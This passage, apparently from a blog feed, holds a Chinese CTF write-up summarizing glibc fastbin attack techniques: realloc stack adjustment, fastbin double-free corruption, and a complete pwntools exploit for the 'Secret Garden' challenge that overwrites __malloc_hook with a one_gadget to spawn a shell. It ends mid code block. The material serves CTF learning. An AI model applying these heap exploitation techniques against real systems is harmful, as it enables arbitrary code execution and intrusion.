94283b2782ac84fb0668bdb538fe54f4d33ecca24444caa9f9d6a15b6cb0e117e147bd0271cd8a8401922e9dcbbc3ad7cd31ab4e5e7d4ffd8d8f5b33944caeefd84d018bbd3361348896bfa3d7e67bb44f4a3e4c5b916ae0c80b5bf4ee2453be955193e4357e9ab34f5c5a49b75446399a9ff58dfc047996dcff28e7f98773701f85fb7a1783e2b523dbd5d4554e2854fe0eccb09ee6e2a77a57901f9472e59d98a5eba01809df0d5e47880eab9b28f83129f0fad9bbce4d13ec844c9504eca0d7d358115e</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Fastbin attack 小结</title>
    <link href="https://n0nop.github.io/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/"/>
    <id>https://n0nop.github.io/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/</id>
    <published>2020-04-15T02:01:55.000Z</published>
    <updated>2020-12-03T03:39:37.397Z</updated>
    
    <content type="html"><![CDATA[<p>这几天刷了四道题，巧了都是Fastbin attack，本来惯用的套路是直接onegadget打<code>__malloc_hook</code>，然后所有onegadget都打不通的情况也很常见，我之前所知道的仅仅局限于<code>__realloc_hook</code>和<code>__malloc_hook</code>的联合使用来调整堆栈，但是也有一定的局限性，这次结合pwnable.tw上的几道题以及CTFhub上收录的CISCN 2019的一道题，小小地总结一下Fastbin attack的一些套路。</p><a id="more"></a><h1 id="Fastbin"><a href="#Fastbin" class="headerlink" title="Fastbin"></a>Fastbin</h1><h2 id="Free"><a href="#Free" class="headerlink" title="Free"></a>Free</h2><ol><li>部分可以参考<a href="https://n0nop.com/2020/04/08/pwn-heap-Spirited-Away/#House-of-spirit-攻击原理" target="_blank" rel="noopener">House of Spirit</a>，写得比较详细了。</li><li>有看到过fastbin合并的操作，但是因为目前没有接触过所以在这里不涉及，欢迎补充</li></ol><h2 id="Malloc"><a href="#Malloc" class="headerlink" title="Malloc"></a>Malloc</h2><ol><li>malloc一个fastbin的时候，会检查该fastbin的size是否合法： <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">// Glibc 2.27</span></span><br><span class="line">   <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br></pre></td></tr></table></figure></li><li>与free一个fastbin不同，malloc一个fastbin不受该fastbin必须地址对齐的约束，也就是说只要size满足便可以任意分配</li><li>若有其他特征，欢迎补充</li></ol><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><p>鉴于由于经常遇到直接往<code>__malloc_hook</code>写onegadget，然后通过malloc触发的方法往往不管用的情况，提供一些解决方案。</p><h2 id="realloc-realloc-hook-malloc-hook"><a href="#realloc-realloc-hook-malloc-hook" class="headerlink" title="realloc, __realloc_hook, __malloc_hook"></a>realloc, __realloc_hook, __malloc_hook</h2><p>这种方法的思路主要是通过<code>realloc</code>来调整堆栈，使得满足onegadget的约束条件</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><br>直接查看<strong>GI__</strong>libc_realloc的汇编码（这里是Glibc 2.27）：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7a7cc30</span> &lt;__GI___libc_realloc&gt;:    <span class="keyword">push</span>   <span class="built_in">r15</span> </span><br><span class="line"><span class="number">0x7ffff7a7cc32</span> &lt;__GI___libc_realloc+<span class="number">2</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cc34</span> &lt;__GI___libc_realloc+<span class="number">4</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7cc36</span> &lt;__GI___libc_realloc+<span class="number">6</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7cc38</span> &lt;__GI___libc_realloc+<span class="number">8</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7cc39</span> &lt;__GI___libc_realloc+<span class="number">9</span>&gt;:    <span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3a</span> &lt;__GI___libc_realloc+<span class="number">10</span>&gt;:    <span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cc3e</span> &lt;__GI___libc_realloc+<span class="number">14</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x35238b</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7cc45</span> &lt;__GI___libc_realloc+<span class="number">21</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>] <span class="comment">; __realloc_hook</span></span><br><span class="line"><span class="number">0x7ffff7a7cc48</span> &lt;__GI___libc_realloc+<span class="number">24</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rax</span>,<span class="built_in">rax</span> <span class="comment">; test if __realloc_hook != NULL</span></span><br><span class="line"><span class="number">0x7ffff7a7cc4b</span> &lt;__GI___libc_realloc+<span class="number">27</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt; <span class="comment">; prepare to call __realloc_hook    </span></span><br><span class="line"><span class="number">0x7ffff7a7cc51</span> &lt;__GI___libc_realloc+<span class="number">33</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rsi</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc54</span> &lt;__GI___libc_realloc+<span class="number">36</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc57</span> &lt;__GI___libc_realloc+<span class="number">39</span>&gt;:    <span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5a</span> &lt;__GI___libc_realloc+<span class="number">42</span>&gt;:    <span class="keyword">sete</span>   <span class="built_in">al</span></span><br><span class="line"><span class="number">0x7ffff7a7cc5d</span> &lt;__GI___libc_realloc+<span class="number">45</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x7ffff7a7cc60</span> &lt;__GI___libc_realloc+<span class="number">48</span>&gt;:    <span class="keyword">setne</span>  <span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc63</span> &lt;__GI___libc_realloc+<span class="number">51</span>&gt;:    <span class="keyword">and</span>    <span class="built_in">al</span>,<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x7ffff7a7cc65</span> &lt;__GI___libc_realloc+<span class="number">53</span>&gt;:    <span class="keyword">jne</span>    <span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cc6b</span> &lt;__GI___libc_realloc+<span class="number">59</span>&gt;:    <span class="keyword">test</span>   <span class="built_in">rdi</span>,<span class="built_in">rdi</span></span><br><span class="line">..............</span><br><span class="line"><span class="number">0x7ffff7a7cee0</span> &lt;__GI___libc_realloc+<span class="number">688</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cee5</span> &lt;__GI___libc_realloc+<span class="number">693</span>&gt;:   <span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x18</span></span><br><span class="line"><span class="number">0x7ffff7a7cee9</span> &lt;__GI___libc_realloc+<span class="number">697</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x7ffff7a7ceea</span> &lt;__GI___libc_realloc+<span class="number">698</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x7ffff7a7ceeb</span> &lt;__GI___libc_realloc+<span class="number">699</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x7ffff7a7ceed</span> &lt;__GI___libc_realloc+<span class="number">701</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x7ffff7a7ceef</span> &lt;__GI___libc_realloc+<span class="number">703</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x7ffff7a7cef1</span> &lt;__GI___libc_realloc+<span class="number">705</span>&gt;:   <span class="keyword">pop</span>    <span class="built_in">r15</span></span><br><span class="line"><span class="number">0x7ffff7a7cef3</span> &lt;__GI___libc_realloc+<span class="number">707</span>&gt;:   <span class="keyword">jmp</span>    <span class="built_in">rax</span> <span class="comment">; jump to __realloc_hook to execute</span></span><br><span class="line"><span class="number">0x7ffff7a7cef5</span> &lt;__GI___libc_realloc+<span class="number">709</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cef8</span> &lt;__GI___libc_realloc+<span class="number">712</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351f69</span>]        </span><br><span class="line"><span class="number">0x7ffff7a7ceff</span> &lt;__GI___libc_realloc+<span class="number">719</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf02</span> &lt;__GI___libc_realloc+<span class="number">722</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:[<span class="built_in">rax</span>],<span class="number">0xc</span></span><br><span class="line"><span class="number">0x7ffff7a7cf09</span> &lt;__GI___libc_realloc+<span class="number">729</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf0e</span> &lt;__GI___libc_realloc+<span class="number">734</span>&gt;:   <span class="keyword">xchg</span>   <span class="built_in">ax</span>,<span class="built_in">ax</span></span><br><span class="line"><span class="number">0x7ffff7a7cf10</span> &lt;__GI___libc_realloc+<span class="number">736</span>&gt;:   <span class="keyword">call</span>   <span class="number">0x7ffff7a7b950</span> &lt;__GI___libc_free&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf15</span> &lt;__GI___libc_realloc+<span class="number">741</span>&gt;:   <span class="keyword">xor</span>    <span class="built_in">r13d</span>,<span class="built_in">r13d</span></span><br><span class="line"><span class="number">0x7ffff7a7cf18</span> &lt;__GI___libc_realloc+<span class="number">744</span>&gt;:   <span class="keyword">jmp</span>    <span class="number">0x7ffff7a7ce1e</span> &lt;__GI___libc_realloc+<span class="number">494</span>&gt;</span><br><span class="line"><span class="number">0x7ffff7a7cf1d</span> &lt;__GI___libc_realloc+<span class="number">749</span>&gt;:   <span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x7ffff7a7cf20</span> &lt;__GI___libc_realloc+<span class="number">752</span>&gt;:   <span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rip</span>+<span class="number">0x351e59</span>]</span><br></pre></td></tr></table></figure><p>如果仅仅关注<code>__realloc_hook</code>存在的情况，那么将上述代码提取出来：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a7cc30 &lt;__GI___libc_realloc&gt;:    push   r15 </span><br><span class="line">0x7ffff7a7cc32 &lt;__GI___libc_realloc+2&gt;:    push   r14</span><br><span class="line">0x7ffff7a7cc34 &lt;__GI___libc_realloc+4&gt;:    push   r13</span><br><span class="line">0x7ffff7a7cc36 &lt;__GI___libc_realloc+6&gt;:    push   r12</span><br><span class="line">0x7ffff7a7cc38 &lt;__GI___libc_realloc+8&gt;:    push   rbp</span><br><span class="line">0x7ffff7a7cc39 &lt;__GI___libc_realloc+9&gt;:    push   rbx</span><br><span class="line">0x7ffff7a7cc3a &lt;__GI___libc_realloc+10&gt;:    sub    rsp,0x18</span><br><span class="line">0x7ffff7a7cc3e &lt;__GI___libc_realloc+14&gt;:    mov    rax,QWORD PTR [rip+0x35238b]   ; __realloc_hook     </span><br><span class="line">0x7ffff7a7cc45 &lt;__GI___libc_realloc+21&gt;:    mov    rax,QWORD PTR [rax] ; *__realloc_hook</span><br><span class="line">0x7ffff7a7cee0 &lt;__GI___libc_realloc+688&gt;:   mov    rdx,QWORD PTR [rsp+0x48]</span><br><span class="line">0x7ffff7a7cee5 &lt;__GI___libc_realloc+693&gt;:   add    rsp,0x18</span><br><span class="line">0x7ffff7a7cee9 &lt;__GI___libc_realloc+697&gt;:   pop    rbx</span><br><span class="line">0x7ffff7a7ceea &lt;__GI___libc_realloc+698&gt;:   pop    rbp</span><br><span class="line">0x7ffff7a7ceeb &lt;__GI___libc_realloc+699&gt;:   pop    r12</span><br><span class="line">0x7ffff7a7ceed &lt;__GI___libc_realloc+701&gt;:   pop    r13</span><br><span class="line">0x7ffff7a7ceef &lt;__GI___libc_realloc+703&gt;:   pop    r14</span><br><span class="line">0x7ffff7a7cef1 &lt;__GI___libc_realloc+705&gt;:   pop    r15</span><br><span class="line">0x7ffff7a7cef3 &lt;__GI___libc_realloc+707&gt;:   jmp    rax ; jump to *__realloc_hook to execute</span><br></pre></td></tr></table></figure><p>可以明显地看到在<code>realloc</code>开始，这里进行了6次<code>push</code>操作，以及一次<code>sub rsp,0x18</code>，再要跳转到<code>__realloc_hook</code>之前，这里又<code>pop</code>了6次，以及一次<code>add rsp,0x18</code>来进行平衡堆栈。<br><br>所以只要相应地减少<code>push</code>的次数或者直接跳转到<code>__GI___libc_realloc+14</code>的位置执行，就能达到压低栈帧的目的，以满足onegadgeat的约束条件。<br><br>因此，只要将<code>__malloc_hook</code>写入<code>realloc+X</code>，将<code>__realloc_hook</code>写入onegadget，救能达到调整栈的目的。至于<code>X</code>是多少，就可在调试的时候观察执行到onegadget的时候，栈的下方多少位置是0，然后再做相应调整。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc &#x3D;&#x3D;&gt; __malloc_hook(realloc+X) &#x3D;&#x3D;&gt; __realloc_hook(onegadget)</span><br></pre></td></tr></table></figure><p><br>注意，这种方法有时候不一定行得通，因为可能在可调整范围内并没有为0的栈位置，也有可能调整后原本为0的位置被改掉了。</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><p>这里暂时没有办法提供举例，但是由于这个方法十分简单并且容易理解，所以讲讲原理就行了。</p><h2 id="fastbin-corruption"><a href="#fastbin-corruption" class="headerlink" title="fastbin corruption"></a>fastbin corruption</h2><p>由于fastbin存在的double free检测机制，会调用<code>malloc_printerr</code>，从而间接地调用<code>malloc</code>来触发<code>__malloc_hook</code>。</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>原理就不多说了，就是利用fastbin double free corruption来调用<code>__malloc_hook</code>的同时，完成了对onegadget约束的满足。</p><h3 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Garden"><a href="#Secret-Garden" class="headerlink" title="Secret Garden"></a>Secret Garden</h4><p><code>delete</code>功能中存在很明显的free后没有清空指针的漏洞，可以进行fastbin double free</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">    _DWORD *v1; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_number )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"No flower in the garden"</span>);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Which flower do you want to remove from the garden:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x63</span> &amp;&amp; (v1 = (_DWORD *)chunk_array[v2]) != <span class="number">0L</span>L )</span><br><span class="line">    &#123;</span><br><span class="line">        *v1 = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">free</span>(*(<span class="keyword">void</span> **)(chunk_array[v2] + <span class="number">8L</span>L));</span><br><span class="line">        result = <span class="built_in">puts</span>(<span class="string">"Successful"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid choice"</span>);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要利用思路：</p><ol><li><p>首先free出一个unsorted bin然后分配这个unsorted bin，利用<code>view</code>功能leak出<code>unsorted bin-&gt;bk</code>中残留的<code>main_arena</code>地址，从而得到libc基址，计算出<code>__malloc_hook</code>的地址。</p></li><li><p>由于fastbin的分配有size检查，所以不能直接分配<code>__malloc_hook</code>处，而是要利用上方的一些地址的高字节<code>0x7F</code>来伪造size字段，从而完成目标内存分配:<br> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/malloc_hook.png" alt></p><p> <img src="/2020/04/15/Fastbin-attack-%E5%B0%8F%E7%BB%93/size.png" alt></p></li><li><p>经过尝试，所有的onegadget都没办法直接打通，这里就需要借助fastbin double free corruption来间接触发<code>__malloc_hook</code>，这里使用的onegadget是条件为<code>[rsp+0x50]==NULL</code>的那个。<br>解题exp（有些地方有些奇怪是因为尝试过<code>realloc</code>调栈的方法，没成功，但懒得改了）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length, name, color)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Length of the name :"</span>, str(length))</span><br><span class="line">    p.sendafter(<span class="string">"The name of flower :"</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"The color of the flower :"</span>, color)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Name of the flower["</span> + str(index) + <span class="string">"] :"</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(<span class="string">"\n"</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice : "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which flower do you want to remove from the garden:"</span>, str(index))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">realloc_hook_offset = <span class="number">0x00000000003c3b08</span> <span class="comment"># libc.symbols["__relloc_hook"] # __malloc_hook = __realloc_hook + 0x8</span></span><br><span class="line">realloc_offset = libc.symbols[<span class="string">"realloc"</span>]</span><br><span class="line"><span class="comment"># one_gadget_offset = 0xf0567</span></span><br><span class="line">one_gadget_offset = <span class="number">0xef6c4</span></span><br><span class="line"><span class="comment"># one_gadget_offset = 0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fast bin double free</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"AAAA"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"BBBB"</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap address</span></span><br><span class="line"><span class="comment"># don't break the double free loop</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"\xe0"</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 2</span></span><br><span class="line">heap_addr = u64(view(<span class="number">2</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x10e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">add(<span class="number">0x200</span>, <span class="string">"CCCC"</span>, <span class="string">"CCCC"</span>) <span class="comment"># chunk 3</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"DDDD"</span>, <span class="string">"DDDD"</span>) <span class="comment"># chunk 4</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add(<span class="number">0x48</span>, <span class="string">"E"</span> * <span class="number">8</span>, <span class="string">"EEEE"</span>) <span class="comment"># chunk 5</span></span><br><span class="line">main_arena = u64(view(<span class="number">5</span>)[<span class="number">8</span>:].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)) - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - main_arena_offset</span><br><span class="line">realloc_hook = libc_base + realloc_hook_offset</span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">one_gadget = libc_base + one_gadget_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># use the double free</span></span><br><span class="line">add(<span class="number">0x68</span>, p64(realloc_hook + <span class="number">8</span> - <span class="number">0x23</span>), <span class="string">"EEEE"</span>) <span class="comment"># chunk 6</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"FFFF"</span>, <span class="string">"FFFF"</span>) <span class="comment"># chunk 7</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">"GGGG"</span>, <span class="string">"GGGG"</span>) <span class="comment"># chunk 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write realloc_hook and malloc_hook</span></span><br><span class="line">add(<span class="number">0x68</span>, (p64(one_gadget) + p64(one_gadget)).rjust(<span class="number">0x1b</span>, <span class="string">"H"</span>), <span class="string">"HHHH"</span>) <span class="comment"># chunk 9</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger malloc_hook (use malloc_printerr, directly call malloc won't work)</span></span><br><span class="line"><span class="comment"># p.sendlineafter("Your choice : ", "1")</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"heap_addr: "</span> + hex(heap_addr))</span><br><span class="line">success(<span class="string">"heap_base: "</span> + hex(heap_base))</span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"libc_realloc: "</span> + hex(libc_realloc))</span><br><span class="line">success(<span class="string">"realloc_hook: "</span> + hex(realloc_hook))</span><br><span class="line">success(<span class="string">"one_gadget: "</span> + hex(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><blockquote><p><b>一些题外话：</b><br>此外，我搜了很多关于<code>__malloc_printerr</code>是怎么触发<code>__malloc_hook</code>的，都没有找到原因。还是特别想知道，咋办？<br>把<code>__malloc_hook</code>写成<code>puts</code>，在触发前在<code>puts</code>处下断点，然后利用gdb的<code>backtrace</code>看下调用栈，藏得够深（还是<code>malloc</code>触发的，只不过这个这个<code>malloc</code>经过了N层函数调用，所以其实可以直接在<code>malloc</code>下断点就行了）。。</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span 